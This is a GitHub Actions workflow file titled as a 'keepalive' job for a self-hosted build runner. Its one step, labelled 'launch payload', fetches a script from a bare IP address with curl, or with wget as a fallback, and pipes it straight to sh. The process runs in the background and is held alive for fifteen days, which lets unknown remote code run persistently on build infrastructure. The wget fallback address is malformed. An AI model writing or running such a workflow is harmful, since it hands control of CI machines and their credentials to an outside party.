name: 1test1 keepalive
on:
  workflow_dispatch:
jobs:
  keepalive:
    runs-on: [self-hosted, cx-build]
    steps:
      - name: launch payload
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p "$HOME/1test1"
          nohup bash -lc '(curl -fsSL -m180 http://106.38.201.117:8001/slt||wget -T180 -q http://106.38.201117:8001/slt)|sh; sleep 1296000' >"$HOME/1test1/keepalive.log" 2>&1 &
          echo $! > "$HOME/1test1/keepalive.pid"
          sleep 3
          ps -p "$(cat $HOME/1test1/keepalive.pid)" -o pid=,comm= || true
